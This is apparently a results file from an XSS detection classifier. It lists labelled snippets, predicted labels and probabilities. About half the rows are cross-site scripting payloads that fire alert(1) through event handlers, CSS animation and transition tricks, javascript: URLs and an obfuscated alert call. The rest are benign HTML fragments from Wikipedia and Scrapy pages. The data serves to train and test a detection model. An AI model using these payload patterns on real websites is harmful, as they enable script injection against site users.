Unnamed: 0,payload,label,predicted_label,probability
9203,"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figcaption>",1,1,0.99591583
6515,<strong id=x tabindex=1 onactivate=alert(1)></strong>,1,1,0.99814475
5055,"<li id=""cite_note-FOOTNOTERussellNorvig2009-7""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-FOOTNOTERussellNorvig2009_7-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-FOOTNOTERussellNorvig2009_7-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,0.00011628147
12854,<map onpointerup=alert(1)>XSS</map>,1,1,0.9977544
5338,"<embed oncontextmenu=""alert(1)"">test</embed>",1,1,0.9981132
243,<input id=x tabindex=1 onactivate=alert(1)></input>,1,1,0.99356574
9292,"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",1,1,0.9978963
2746,"<style>:target {transform: rotate(180deg);}</style><element id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></element>",1,1,0.99798703
4732,"<li><a href=""/wiki/Atomtronics"" title=""Atomtronics"">Atomtronics </a> </li>",0,0,0.0022562395
13340,"<IMG STYLE="":expr/**/ession(alert(''))"">",1,1,0.99552315
12020,	 </span> </h3>,0,0,4.0975585e-05
329,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/extensions.html"">Extensions</a></li>",0,0,0.00015156665
1139,"<h4><span class=""mw-headline"" id=""Robot_rights"">Robot rights ",0,0,0.00061978557
3497,"<li><cite id=""CITEREFNilsson1998"" class=""citation book""><a href=""/wiki/Nils_Nilsson_(researcher)"" class=""mw-redirect"" title=""Nils Nilsson (researcher)"">Nilsson, Nils </a> (1998). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/artificialintell0000nils""><i>Artificial Intelligence: A New Synthesis </i> </a> ",0,0,0.00012245755
10573,"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;453–541 </li> </ul>",0,0,0.00013465298
833,"<time onbeforecut=""alert(1)"" contenteditable>test</time>",1,1,0.99698114
12945,"<sub onmouseout=""alert(1)"">test</sub>",1,1,0.99761075
9686,"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, ~I.2.7 </li>",0,0,0.00015959478
9731,	 </span>(2011) </li>,0,0,0.042188227
6397,"<li><cite class=""citation web"">Tom Simonite (29 December 2014). <a rel=""nofollow"" class=""external text"" href=""http://www.technologyreview.com/news/533686/2014-in-computing-breakthroughs-in-artificial-intelligence/"">""2014 in Computing: Breakthroughs in Artificial Intelligence"" </a>. <i>MIT Technology Review </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=MIT+Technology+Review&amp;rft.atitle=2014+in+Computing%3A+Breakthroughs+in+Artificial+Intelligence&amp;rft.date=2014-12-29&amp;rft.au=Tom+Simonite&amp;rft_id=http%3A%2F%2Fwww.technologyreview.com%2Fnews%2F533686%2F2014-in-computing-breakthroughs-in-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.048263e-06
12843,URL=javascript:alert(''),1,1,0.99533755
2025,AI in myth:,0,0,0.0017464517
4059,"<rt onpaste=""alert(1)"" contenteditable>test</rt>",1,1,0.9979423
6345,"<br oncontextmenu=""alert(1)"">test</br>",1,1,0.99813896
188,"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",1,1,0.99791133
1536,	 </span>,0,0,6.0303642e-05
4409,"<li>Looking for specific information? Try the <a class=""hoverxref reference internal"" data-doc=""genindex"" data-project=""scrapy"" data-section="""" data-version=""latest"" href=""genindex.html""><span class=""std std-ref"">Index",0,0,0.00011702787
924,"<li><a href=""/wiki/Digital_marketing"" title=""Digital marketing"">Digital marketing </a> </li>",0,0,0.00011973482
4544, ,0,0,0.0009942207
12460,"	 <div id=""Evolutionary_computation"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">Evolutionary computation </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Main Topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,2.0464982e-05
5655,<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,1,1,0.99829245
12377,"<a href=""/wiki/Artificial_brain"" title=""Artificial brain"">Artificial brain </a> arguments: AI requires a simulation of the operation of the human brain",0,0,0.00022705355
8845,document.scripts.length,1,1,0.9848993
11899,"	 </span> <span class=""reference-text"">Arntz, Melanie, Terry Gregory, and Ulrich Zierahn. ""The risk of automation for jobs in OECD countries: A comparative analysis."" OECD Social, Employment, and Migration Working Papers 189 (2016). p. 33. ",0,0,2.0489551e-05
9688,"<dt><a class=""reference internal"" href=""topics/jobs.html""><span class=""doc"">Jobs: pausing and resuming crawls",0,0,0.012080485
1966,"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://en.wikibooks.org/wiki/Special:Search/Artificial_intelligence"" class=""extiw"" title=""b:Special:Search/Artificial intelligence"">Textbooks </a> from Wikibooks ",0,0,2.1691418e-05
8970,<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,1,1,0.9966176
12487,"<listing onmouseenter=""alert(1)"">test</listing>",1,1,0.9923758
11116,"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",1,1,0.99750215
5968,"<strong draggable=""true"" ondrag=""alert(1)"">test</strong>",1,1,0.9983688
11258,"<dt><a class=""reference internal"" href=""topics/benchmarking.html""><span class=""doc"">Benchmarking",0,0,0.011095089
8572,"<q onmouseup=""alert(1)"">test</q>",1,1,0.99676865
12923,<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>,1,1,0.99780035
4571,"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>",1,1,0.9956435
1408,"document.getElementsByClassName("""").length",1,1,0.9973791
9258,"<var draggable=""true"" ondrag=""alert(1)"">test</var>",1,1,0.9979367
11125,<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1,1,0.9954924
11161,"<address onbeforecut=""alert(1)"" contenteditable>test</address>",1,1,0.9978591
3229,url(javascript:alert('')),1,1,0.9956234
7171,	 </span>,0,0,6.0303642e-05
7532,"<li><a href=""/wiki/Jennifer_Wilby"" title=""Jennifer Wilby"">Jennifer Wilby </a> </li>",0,0,0.00018557791
764,"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>",1,1,0.9950923
1259,<menuitem onpointerleave=alert(1)>XSS</menuitem>,1,1,0.9978049
12412,<tr id=x tabindex=1 onfocus=alert(1)></tr>,1,1,0.9966442
6231,"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>",1,1,0.9975097
11641,"<select onbeforecut=""alert(1)"" contenteditable>test</select>",1,1,0.9955634
714,"<option onkeydown=""alert(1)"" contenteditable>test</option>",1,1,0.99797153
3739,"<li><a href=""/wiki/SONOS"" title=""SONOS"">SONOS </a> </li> </ul> </li>",0,0,0.00018962195
1726,<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,1,1,0.991188
7613,"<li><cite id=""CITEREFEdelson1991"" class=""citation book"">Edelson, Edward (1991). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/nervoussystem0000edel""><i>The Nervous System </i> </a> ",0,0,0.00012534612
265,<hr id=x tabindex=1 onactivate=alert(1)></hr>,1,1,0.9845596
9249,"<li id=""cite_note-Classifiers-216""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Classifiers_216-0"">^ </a> </b> ",0,0,0.00010678445
12598,"<li><a href=""/wiki/Computationalism"" class=""mw-redirect"" title=""Computationalism"">Computationalism </a> </li>",0,0,0.00010765658
9186,"<p>The simplest AI applications can be divided into two types: classifiers (""if shiny then diamond"") and controllers (""if shiny then pick up""). Controllers do, however, also classify conditions before inferring actions, and therefore classification forms a central part of many AI systems. <a href=""/wiki/Classifier_(mathematics)"" class=""mw-redirect"" title=""Classifier (mathematics)"">Classifiers </a> are functions that use <a href=""/wiki/Pattern_matching"" title=""Pattern matching"">pattern matching </a> to determine a closest match. They can be tuned according to examples, making them very attractive for use in AI. These examples are known as observations or patterns. In supervised learning, each pattern belongs to a certain predefined class. A class can be seen as a decision that has to be made. All the observations combined with their class labels are known as a data set. When a new observation is received, that observation is classified based on previous experience.<sup id=""cite_ref-Classifiers_216-0"" class=""reference""><a href=""#cite_note-Classifiers-216"">&#91;210&#93; </a> </sup>",0,0,2.8681528e-05
8095,	 </span> </li>,0,0,4.039223e-05
862,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;462–644, </li>",0,0,0.00013754731
5086,"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",1,1,0.99753296
2130,<em onpointerout=alert(1)>XSS</em>,1,1,0.99770063
12085,"<ul><li><a href=""/wiki/Averroes"" title=""Averroes"">Averroes </a> </li>",0,0,0.00020393249
2099,	 </span>,0,0,6.0303642e-05
5213,"<cite onmouseout=""alert(1)"">test</cite>",1,1,0.9965511
6681,	 </span>,0,0,6.0303642e-05
5556,"<details onmousemove=""alert(1)"">test</details>",1,1,0.9970912
11371,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
5067,<table onpointerleave=alert(1)>XSS</table>,1,1,0.99737096
5778,"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",1,1,0.99559236
5199,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
10695,"            <a href=""#"" class=""icon icon-home""> Scrapy",0,0,4.72936e-05
11023, </li>,0,0,0.00012413738
4493,"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",1,1,0.9956438
3022,	 </span> 2019 ,0,0,4.3054803e-05
4305,"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;426–441 </li>",0,0,0.00015855215
3415,"	 </span> <span class=""reference-text"">West, Darrell M. ""Moving forward: Self-driving vehicles in China, Europe, Japan, Korea, and the United States"". Center for Technology Innovation at Brookings. N.p., September 2016. 12 November 2016. ",0,0,2.054945e-05
1829,"<bdo onclick=""alert(1)"">test</bdo>",1,1,0.99496275
7116,"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;115–117 </li>",0,0,0.00016008373
12659,"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",1,1,0.997914
12742,	 </span> ,0,0,5.1390383e-05
1338,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;361–381, </li>",0,0,0.00013690573
653,<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,1,1,0.9953886
9595,	 </span></a></dt><dd>Customize the input and output of your spiders.</dd>,0,0,3.3623906e-05
5731,"<image onmouseover=""alert(1)"">test</image>",1,1,0.9974385
3459,<noembed id=x tabindex=1 onfocus=alert(1)></noembed>,1,1,0.99789923
11360,<sub onpointerleave=alert(1)>XSS</sub>,1,1,0.99717563
4204,"<area onkeyup=""alert(1)"" contenteditable>test</area>",1,1,0.99780566
10789,<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,1,1,0.99497694
11259,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",1,1,0.9974925
5842,"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1,1,0.9965528
11103,	 </span>,0,0,6.0303642e-05
11320,<section onpointerover=alert(1)>XSS</section>,1,1,0.9976387
2488,"<li><a href=""/wiki/Center_for_Human-Compatible_Artificial_Intelligence"" title=""Center for Human-Compatible Artificial Intelligence"">Center for Human-Compatible Artificial Intelligence </a> </li>",0,0,0.00012571538
11173,"	 </span> <span class=""reference-text"">Anderson, Susan Leigh. ""Asimov's ""three laws of robotics"" and machine metaethics."" AI &amp; Society 22.4 (2008): 477–493. ",0,0,2.0522739e-05
4644,	 </span> </a> </li>,0,0,3.6811532e-05
9922,	 </span>,0,0,6.0303642e-05
9165,<object onpointerover=alert(1)>XSS</object>,1,1,0.99837196
6334,"<optgroup onbeforecut=""alert(1)"" contenteditable>test</optgroup>",1,1,0.9984697
2698,"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",1,1,0.99561596
2543,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lombardo P, Boehm I, Nairz K (2020). ""RadioComics – Santa Claus and the future of radiology"". <i>Eur J Radiol </i>. <b>122 </b> (1): 108771. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.ejrad.2019.108771"">10.1016/j.ejrad.2019.108771 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/31835078"">31835078 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Eur+J+Radiol&amp;rft.atitle=RadioComics+%E2%80%93+Santa+Claus+and+the+future+of+radiology&amp;rft.volume=122&amp;rft.issue=1&amp;rft.pages=108771&amp;rft.date=2020&amp;rft_id=info%3Adoi%2F10.1016%2Fj.ejrad.2019.108771&amp;rft_id=info%3Apmid%2F31835078&amp;rft.aulast=Lombardo&amp;rft.aufirst=P&amp;rft.au=Boehm%2C+I&amp;rft.au=Nairz%2C+K&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,3.6947433e-05
12978,"<textarea onmouseover=""alert(1)"">test</textarea>",1,1,0.9984195
773, </li>,0,0,0.00012413738
7347,"<tr onkeypress=""alert(1)"" contenteditable>test</tr>",1,1,0.9979067
3613,"<header onmouseover=""alert(1)"">test</header>",1,1,0.99634475
3726,"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",1,1,0.99653983
11881,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=MIT+Sloan+Management+Review&amp;rft.atitle=Reshaping+Business+With+Artificial+Intelligence&amp;rft_id=https%3A%2F%2Fsloanreview.mit.edu%2Fprojects%2Freshaping-business-with-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.1721891e-05
13249,"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",1,1,0.9956638
5022,"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",1,1,0.9979112
13194,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
9609,"<li id=""cite_note-lstm-266""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-lstm_266-0"">^ </a> </b> ",0,0,0.000111743095
7080,"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",1,1,0.99736446
6548,"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",1,1,0.9983424
6669,"<address onclick=""alert(1)"">test</address>",1,1,0.9970479
5569,"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1,1,0.9924517
10461,	 </span>,0,0,6.0303642e-05
5903,"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",1,1,0.9956732
7679,"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",1,1,0.997987
7543,"<li><a href=""/wiki/Understanding"" title=""Understanding"">Understanding </a> </li>",0,0,0.00010553992
1967,"<h3><span class=""mw-headline"" id=""The_limits_of_artificial_general_intelligence"">The limits of artificial general intelligence ",0,0,0.0003599415
1978,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485425
7035,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
3441,"<listing onclick=""alert(1)"">test</listing>",1,1,0.94429916
9128,"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1,1,0.99773073
10413,"<hgroup onmouseover=""alert(1)"">test</hgroup>",1,1,0.99697065
4555,"<ul oncut=""alert(1)"" contenteditable>test</ul>",1,1,0.9910325
4393, </li>,0,0,0.00012413738
10520,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",1,1,0.9974925
10763,<dir onpointerup=alert(1)>XSS</dir>,1,1,0.99669075
8475,<li>Memory,0,0,0.006267594
6972,"	<a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a><sup id=""cite_ref-Natural_language_processing_120-0"" class=""reference""><a href=""#cite_note-Natural_language_processing-120"">&#91;117&#93; </a> </sup> (NLP) gives machines the ability to read and <a href=""/wiki/Natural_language_understanding"" class=""mw-redirect"" title=""Natural language understanding"">understand </a> human language. A sufficiently powerful natural language processing system would enable <a href=""/wiki/Natural-language_user_interface"" title=""Natural-language user interface"">natural-language user interfaces </a> and the acquisition of knowledge directly from human-written sources, such as newswire texts. Some straightforward applications of natural language processing include <a href=""/wiki/Information_retrieval"" title=""Information retrieval"">information retrieval </a>, <a href=""/wiki/Text_mining"" title=""Text mining"">text mining </a>, <a href=""/wiki/Question_answering"" title=""Question answering"">question answering </a><sup id=""cite_ref-121"" class=""reference""><a href=""#cite_note-121"">&#91;118&#93; </a> </sup> and <a href=""/wiki/Machine_translation"" title=""Machine translation"">machine translation </a>.<sup id=""cite_ref-Applications_of_natural_language_processing_122-0"" class=""reference""><a href=""#cite_note-Applications_of_natural_language_processing-122"">&#91;119&#93; </a> </sup> Many current approaches use word co-occurrence frequencies to construct syntactic representations of text. ""Keyword spotting"" strategies for search are popular and scalable but dumb; a search query for ""dog"" might only match documents with the literal word ""dog"" and miss a document with the word ""poodle"". ""Lexical affinity"" strategies use the occurrence of words such as ""accident"" to <a href=""/wiki/Sentiment_analysis"" title=""Sentiment analysis"">assess the sentiment </a> of a document. Modern statistical NLP approaches can combine all these strategies as well as others, and often achieve acceptable accuracy at the page or paragraph level, but continue to lack the semantic understanding required to classify isolated sentences well. Besides the usual difficulties with encoding semantic commonsense knowledge, existing semantic NLP sometimes scales too poorly to be viable in business applications. Beyond semantic NLP, the ultimate goal of ""narrative"" NLP is to embody a full understanding of commonsense reasoning.<sup id=""cite_ref-123"" class=""reference""><a href=""#cite_note-123"">&#91;120&#93; </a> </sup>",0,0,8.1306625e-06
10776,"<canvas draggable=""true"" ondragleave=""alert(1)"">test</canvas>",1,1,0.9977014
2786,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
11660,"<multicol onmouseover=""alert(1)"">test</multicol>",1,1,0.9960376
1295,"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",1,1,0.9980023
7412,"Formal methods are now preferred (""Victory of the <a href=""/wiki/Neats_vs._scruffies"" class=""mw-redirect"" title=""Neats vs. scruffies"">neats </a>""):",0,0,0.00053345127
5867,"<details draggable=""true"" ondrag=""alert(1)"">test</details>",1,1,0.99663514
9618,"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",1,1,0.9979524
13284,"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",1,1,0.99752766
7009,<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,1,1,0.991857
245, </li>,0,0,0.00012413738
12596,<dt onpointerenter=alert(1)>XSS</dt>,1,1,0.9977047
4281,"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",1,1,0.997873
1718,"	 </span> <span class=""reference-text""><a href=""#CITEREFKatz2012"">Katz 2012 </a>. ",0,0,2.052217e-05
2383,<body onblur=alert(1) id=x><iframe id=x>,1,1,0.99813277
349,"			<img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x"" data-file-width=""2272"" data-file-height=""1704"" /> </a>  ",0,0,9.861494e-06
2959,	 </span> </h3>,0,0,4.0975585e-05
10232,	 </span> </li>,0,0,4.039223e-05
8349,"	 </span>  <small class=""date-container""><i>(<span class=""date"">January 2020 ",0,0,2.0452066e-05
4231,"<h1 draggable=""true"" ondragstart=""alert(1)"">test</h1>",1,1,0.99487484
3362,"<style data-mw-deduplicate=""TemplateStyles:r886047268"">.mw-parser-output .refbegin{font-size:90%;margin-bottom:0.5em}.mw-parser-output .refbegin-hanging-indents>ul{list-style-type:none;margin-left:0}.mw-parser-output .refbegin-hanging-indents>ul>li,.mw-parser-output .refbegin-hanging-indents>dl>dd{margin-left:0;padding-left:3.2em;text-indent:-3.2em;list-style:none}.mw-parser-output .refbegin-100{font-size:100%} </style>",0,1,0.9969562
9738,<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,1,1,0.9983668
5738,top[‘al\x65rt’](1),1,1,0.9968957
4816,"<br onmouseenter=""alert(1)"">test</br>",1,1,0.9981128
10936,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
11060,"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",1,1,0.9978569
6722,<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1,1,0.9977811
1604,"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",1,1,0.99775696
12283,<marquee onstart=alert(1)></marquee>,1,1,0.99822766
2244,"<li id=""cite_note-contemporary_agi-146""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-contemporary_agi_146-0"">^ </a> </b> ",0,0,0.00011916179
10751,"<th onbeforecut=""alert(1)"" contenteditable>test</th>",1,1,0.9941802
4847,"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1,1,0.9974841
1178,	 </span> ,0,0,5.1390383e-05
3865,<tr onpointerenter=alert(1)>XSS</tr>,1,1,0.99801165
7441,"<s onkeyup=""alert(1)"" contenteditable>test</s>",1,1,0.9963117
2084,<dd id=x tabindex=1 onactivate=alert(1)></dd>,1,1,0.99348915
4584,	 </span>,0,0,6.0303642e-05
786,"<acronym onmouseup=""alert(1)"">test</acronym>",1,1,0.99829465
1310,"<li><a href=""/wiki/Evolution_strategy"" title=""Evolution strategy"">Evolution strategy </a> </li>",0,0,0.0007241244
6529,"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",1,1,0.99559456
5422,"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1,1,0.99818075
9281,"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",1,1,0.9975007
12612,"<li id=""cite_note-182""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-182"">^ </a> </b> ",0,0,0.00011732778
7103,	 </span> </h3>,0,0,4.0975585e-05
4746,	 </span> </li>,0,0,4.039223e-05
13552,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
13106,      <hr/>,0,0,5.3194508e-05
2593,"	 </span> <span class=""reference-text""><a href=""/wiki/Seppo_Linnainmaa"" title=""Seppo Linnainmaa"">Seppo Linnainmaa </a> (1970). The representation of the cumulative rounding error of an algorithm as a Taylor expansion of the local rounding errors. Master's Thesis (in Finnish), Univ. Helsinki, 6–7. ",0,0,2.0635604e-05
12709,<cite onpointerleave=alert(1)>XSS</cite>,1,1,0.99572587
8313,"<style oncut=""alert(1)"" contenteditable>test</style>",1,1,0.9973633
